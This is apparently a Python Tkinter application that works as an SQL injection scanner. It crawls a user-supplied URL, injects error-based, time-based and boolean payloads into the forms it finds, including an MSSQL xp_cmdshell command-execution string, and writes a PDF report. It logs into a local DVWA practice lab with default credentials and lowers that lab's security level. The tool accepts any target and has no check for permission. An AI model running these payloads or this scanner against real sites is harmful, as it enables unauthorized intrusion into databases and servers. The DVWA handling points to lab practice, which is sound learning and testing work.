import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import threading
import sys
import traceback
# Add these imports at the top
from fpdf import FPDF
from datetime import datetime

# Debug configuration
VERBOSE = True  # Set to False to disable detailed output

def debug_log(message):
    """Print messages to both GUI and terminal"""
    if VERBOSE:
        print(f"[DEBUG] {message}")
    log_text.insert(tk.END, f"{message}\n")
    log_text.yview(tk.END)

# Enhanced Payload Database
PAYLOADS = {
    'error_based': [
        ("'", "Universal quote test"),
        ("') OR 1=1-- -", "MySQL boolean"),
        ("' OR 1=1; EXEC xp_cmdshell('ping 127.0.0.1')--", "MSSQL RCE"),
        ("'||(SELECT 1 FROM dual)--", "Oracle test")
    ],
    'time_based': [
        ("' OR SLEEP(5)-- -", "MySQL delay"),
        ("'||pg_sleep(5)--", "PostgreSQL delay"),
        ("'; WAITFOR DELAY '0:0:5'--", "MSSQL delay")
    ]
}

def start_scan_threaded():
    try:
        debug_log("Starting scan thread")
        scan_thread = threading.Thread(target=start_scan)
        scan_thread.start()
    except Exception as e:
        debug_log(f"Thread error: {traceback.format_exc()}")



class SQLiTester:
    def __init__(self, target_url):
        self.session = requests.Session()
        self.vulnerabilities = []
        self.target_url = target_url
        self.dvwa_authenticated = False
        debug_log("Initialized SQLiTester with fresh session")
        self.authenticate_if_needed()

    def authenticate_if_needed(self):
        """Check and handle authentication before scanning"""
        if 'dvwa' in self.target_url:
            debug_log("Detected DVWA URL, checking authentication")
            self.handle_dvwa_auth()

    def handle_dvwa_auth(self):
        """Check and handle DVWA authentication"""
        try:
            test_url = "http://localhost/dvwa/vulnerabilities/sqli/"
            response = self.session.get(test_url, verify=False, allow_redirects=False)
            
            if response.status_code == 302:
                debug_log("DVWA authentication required")
                self.dvwa_login()
        except Exception as e:
            debug_log(f"DVWA auth check error: {str(e)}")

    def dvwa_login(self):
        """Authenticate with DVWA"""
        try:
            login_url = "http://localhost/dvwa/login.php"
            response = self.session.get(login_url, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Get CSRF token
            token = soup.find('input', {'name': 'user_token'}).get('value', '')
            debug_log(f"Found DVWA CSRF token: {token}")
            
            login_data = {
                'username': 'admin',
                'password': 'password',
                'Login': 'Login',
                'user_token': token
            }
            
            response = self.session.post(login_url, data=login_data, verify=False)
            if 'PHPSESSID' in self.session.cookies:
                debug_log("DVWA login successful")
                self.dvwa_authenticated = True
                self.set_dvwa_security()
            else:
                debug_log("DVWA login failed")
        except Exception as e:
            debug_log(f"DVWA login error: {str(e)}")

    def set_dvwa_security(self):
        """Set DVWA security level to low"""
        try:
            security_url = "http://localhost/dvwa/security.php"
            response = self.session.get(security_url, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            token = soup.find('input', {'name': 'user_token'}).get('value', '')
            
            security_data = {
                'security': 'low',
                'seclev_submit': 'Submit',
                'user_token': token
            }
            self.session.post(security_url, data=security_data, verify=False)
            debug_log("DVWA security set to low")
        except Exception as e:
            debug_log(f"Security setting error: {str(e)}")

    def test_form(self, form_url, method, inputs):
        try:            
            debug_log(f"\n=== Testing form: {form_url} ===")
            debug_log(f"Method: {method} | Inputs: {inputs}")
            
            # Get fresh form state
            try:
                response = self.session.get(form_url, verify=False, timeout=10)
                debug_log(f"GET {form_url} → {response.status_code}")
                soup = BeautifulSoup(response.text, 'html.parser')
            except Exception as e:
                debug_log(f"Form fetch failed: {str(e)}")
                return False

            form = soup.find('form')
            if not form:
                debug_log("No form found in response")
                return False

            # Build base data with CSRF handling
            base_data = {}
            inputs_list = [i.strip() for i in inputs.split(',')]
            for tag in form.find_all('input'):
                name = tag.get('name')
                value = tag.get('value', '')
                
                if tag.get('type') == 'hidden':
                    base_data[name] = value
                    debug_log(f"Found hidden field: {name}={value}")
                elif name in inputs_list:
                    base_data[name] = '1'  # Safe value
                    debug_log(f"Found input field: {name}")

            # Test payloads
            for payload_type in PAYLOADS:
                for payload, description in PAYLOADS[payload_type]:
                    try:
                        debug_log(f"\n=== Testing form: {form_url} ===")
                        debug_log(f"Method: {method} | Inputs: {inputs}")
                        if 'dvwa/vulnerabilities/sqli' in form_url:
                            debug_log("Detected DVWA SQLi form, using direct injection")
                            return self.test_dvwa_sqli_form(form_url, method, inputs)
                        test_data = base_data.copy()
                        for field in inputs_list:
                            if field in test_data and field not in [k for k,v in base_data.items() if v]:
                                test_data[field] = payload
                                debug_log(f"Injected {field} with payload")

                        debug_log(f"Final test data: {test_data}")
                        
                        if method == 'get':
                            response = self.session.get(
                                form_url, 
                                params=test_data, 
                                timeout=15
                            )
                        else:
                            response = self.session.post(
                                form_url, 
                                data=test_data, 
                                timeout=15
                            )
                        
                        debug_log(f"Response: {response.status_code} in {response.elapsed.total_seconds():.2f}s")
                        debug_log(f"Content snippet: {response.text[:200]}...")
                        
                        if self.is_vulnerable(response, payload_type):
                            debug_log(f"!!! VULNERABILITY FOUND: {payload_type}")
                            self.vulnerabilities.append({
                                'url': form_url,
                                'payload': payload,
                                'type': payload_type,
                                'confidence': 'High' if payload_type == 'error_based' else 'Medium'
                            })
                            return True
                            
                    except requests.exceptions.Timeout:
                        debug_log("Timeout occurred during request")
                    except Exception as e:
                        debug_log(f"Payload test error: {traceback.format_exc()}")
            
            return False
        except Exception as e:
            debug_log(f"Form test error: {traceback.format_exc()}")
            return False
        
    def test_dvwa_sqli_form(self, form_url, method, inputs):
        """Special handler for DVWA's SQLi form"""
        try:
            # Get baseline response
            normal_data = {'id': '1', 'Submit': 'Submit'}
            baseline_response = self.session.get(form_url, params=normal_data, timeout=15)
            baseline_text = baseline_response.text

            # Send payload
            test_data = {'id': "' OR 1=1 -- ", 'Submit': 'Submit'}
            response = self.session.get(form_url, params=test_data, timeout=15)
            response_text = response.text

            debug_log(f"Response: {response.status_code}")
            debug_log(f"Content length: {len(response_text)}")

            # Detection criteria
            vuln_detected = False
            if "First name" in response_text:
                # Count number of users shown
                user_count = response_text.count("First name")
                if user_count > 1:
                    debug_log(f"Found {user_count} users - vulnerability confirmed")
                    vuln_detected = True

            if "SQL syntax" in response_text:
                debug_log("Found SQL error message")
                vuln_detected = True

            if len(response_text) - len(baseline_text) > 100:
                debug_log("Significant content difference detected")
                vuln_detected = True

            if vuln_detected:
                debug_log("!!! VULNERABILITY FOUND: boolean_based")
                self.vulnerabilities.append({
                    'url': form_url,
                    'payload': test_data['id'],
                    'type': 'boolean',
                    'confidence': 'High'
                })
                return True

            return False
        except Exception as e:
            debug_log(f"DVWA test error: {str(e)}")
            return False
            
    def is_vulnerable(self, response, payload_type):
        try:
            content = response.text

            if payload_type == 'error_based':
                return any(error in content.lower() for error in [
                    'sql syntax', 'unclosed quotation', 'warning: mysql'
                ])

            elif payload_type == 'time_based':
                return response.elapsed.total_seconds() > 4

            elif payload_type == 'boolean':
                # Generic boolean indicators
                return any(marker in content.lower() for marker in [
                    'welcome back', 'login success', 'user exists', 'admin'
                ]) or "First name" in content  # DVWA-specific

            return False
        except Exception as e:
            debug_log(f"Vulnerability check error: {str(e)}")
            return False

def crawl_forms(url, session):
    try:
        debug_log(f"\nCrawling URL: {url}")
        response = session.get(url, verify=False, timeout=10)
        
        # Handle redirects to login page
        if 'login' in response.url:
            debug_log("Redirected to login page")
            return None, "Authentication required"
            
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = []
        
        for form in soup.find_all('form'):
            # Get form action relative to current page
            action = form.get('action', '')
            method = form.get('method', 'get').lower()
            
            # Resolve URL based on current page, not DVWA root
            full_action = urljoin(url, action)
            
            debug_log(f"\nFound form: {method} {full_action}")
            
            inputs = []
            for tag in form.find_all(['input', 'textarea']):
                if tag.get('type') in ['submit', 'hidden', 'button']:
                    continue
                if name := tag.get('name'):
                    inputs.append(name)
                    debug_log(f"Found input: {name} ({tag.name})")
            
            if inputs:
                forms.append((full_action, method, ", ".join(inputs)))
                debug_log("Form added to test list")
        
        debug_log(f"Total forms found: {len(forms)}")
        return forms, None
    except Exception as e:
        error_msg = f"Crawl error: {traceback.format_exc()}"
        debug_log(error_msg)
        return None, error_msg

def start_scan():
    try:
        debug_log("\n" + "="*50)
        debug_log("Starting new scan")
        
        url = url_entry.get().strip()
        if not url:
            messagebox.showerror("Error", "Please enter a valid URL!")
            return
        
        # Reset UI elements
        log_text.delete(1.0, tk.END)
        for row in tree.get_children():
            tree.delete(row)
        progress['value'] = 0
        
        tester = SQLiTester(url)  # Pass URL to tester
        generate_report.tester = tester  # MOVE THIS LINE HERE  <-----
        debug_log("Created SQLiTester instance")
        
        forms, error = crawl_forms(url, tester.session)
        
        if error:
            debug_log(f"Crawl error: {error}")
        elif forms:
            debug_log(f"Found {len(forms)} forms to test")
            progress['maximum'] = len(forms)
            
            for index, form in enumerate(forms):
                form_url, method, inputs = form
                debug_log(f"\nTesting form {index+1}/{len(forms)}")
                debug_log(f"URL: {form_url}")
                debug_log(f"Method: {method}")
                debug_log(f"Inputs: {inputs}")
                
                tree.insert("", tk.END, values=form)
                
                if tester.test_form(form_url, method, inputs):
                    debug_log("Marking form as vulnerable")
                    tree.item(tree.get_children()[index], tags=('vulnerable',))
                
                progress['value'] = index + 1
                root.update_idletasks()
            
            tree.tag_configure('vulnerable', background='#ffcccc')
            report_button.config(state="normal")
        
        debug_log("Scan completed")
        
    except Exception as e:
        debug_log(f"Scan error: {traceback.format_exc()}")
        messagebox.showerror("Critical Error", "Check debug logs")
        

# Add this function right before the GUI setup section
def generate_report():
    if not hasattr(generate_report, 'tester') or not generate_report.tester.vulnerabilities:
        messagebox.showinfo("Info", "No vulnerabilities to report")
        return
    
    vulnerabilities = generate_report.tester.vulnerabilities
    filename = f"SQLi_Report_{datetime.now().strftime('%Y%m%d_%H%M')}.pdf"
    
    try:
        pdf = FPDF()
        pdf.add_page()
        pdf.set_font("Arial", size=12)
        
        # Report header
        pdf.cell(200, 10, txt="SQL Injection Scan Report", ln=1, align='C')
        pdf.cell(200, 10, txt=f"Scanned URL: {url_entry.get()}", ln=1)
        pdf.cell(200, 10, txt=f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M')}", ln=1)
        pdf.ln(10)
        
        # Vulnerabilities section
        pdf.set_fill_color(200, 220, 255)
        pdf.cell(200, 10, txt=f"Found {len(vulnerabilities)} vulnerabilities:", ln=1, fill=True)
        
        for idx, vuln in enumerate(vulnerabilities, 1):
            pdf.multi_cell(0, 10, txt=f"""
            Vulnerability #{idx}
            URL: {vuln['url']}
            Type: {vuln['type'].title()}-Based
            Payload: {vuln['payload']}
            Confidence: {vuln['confidence']}
            """, border=1)
            pdf.ln(3)
        
        pdf.output(filename)
        messagebox.showinfo("Success", f"Report saved as {filename}")
    except Exception as e:
        messagebox.showerror("Error", f"Failed to generate report: {str(e)}")

# GUI Setup
root = tk.Tk()
root.title("SQL Injection Scanner")
root.geometry("750x450")

# URL Input
frame_top = tk.Frame(root)
frame_top.pack(pady=10)
tk.Label(frame_top, text="Target URL:").pack(side=tk.LEFT, padx=5)
url_entry = tk.Entry(frame_top, width=50)
url_entry.pack(side=tk.LEFT, padx=5)
scan_button = tk.Button(frame_top, text="Start Scan", command=start_scan_threaded)
scan_button.pack(side=tk.LEFT, padx=5)

# Results Table
columns = ("Form URL", "Method", "Input Fields")
tree = ttk.Treeview(root, columns=columns, show="headings", height=8)
for col in columns:
    tree.heading(col, text=col)
    tree.column(col, width=200)
tree.pack(pady=10)

# Log Output
log_text = scrolledtext.ScrolledText(root, height=8, width=80, state="normal")
log_text.pack(pady=10)

# Generate Report Button
# Update the report button configuration to:
report_button = tk.Button(root, text="Generate Report", command=generate_report, state="disabled")
report_button.pack(pady=5)

# Progress Bar
progress = ttk.Progressbar(root, orient="horizontal", length=200, mode="determinate")
progress.pack(pady=5)

root.mainloop()